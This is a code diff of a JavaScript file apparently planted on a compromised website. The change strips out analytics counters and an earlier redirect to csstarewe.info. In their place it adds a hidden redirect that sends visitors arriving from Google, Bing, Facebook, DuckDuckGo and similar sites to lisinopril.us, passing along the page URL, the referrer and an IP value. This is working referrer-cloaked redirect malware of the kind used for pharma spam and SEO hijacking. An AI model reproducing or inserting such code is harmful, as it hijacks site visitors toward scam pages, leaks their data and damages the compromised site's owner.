@@ -1,21 +1,7 @@
-///// Histats /////
-document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4908480&101"width="0" height="0"/>');
-
-///// Statcounter /////
-
-var sc_project=13059466; 
-var sc_invisible=1; 
-var sc_security="c801499b"; 
-
-document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
-document.write('<noscript>');
-document.write('<div class="statcounter">');
-document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
-document.write('<img class="statcounter" src="https://c.statcounter.com/13059466/0/c801499b/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
-document.write('</a>');
-document.write('</div>');
-document.write('</noscript>');
-
 ///// Arsae /////
-var ars = 'https://csstarewe.info/a.php';
-if(['.edu.', '.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+var arsT1Bing = 'https://lisinopril.us';
+// var arsT1Google = 'https://bohkreh.com';
+
+if(['google.', '.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
+	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
+}
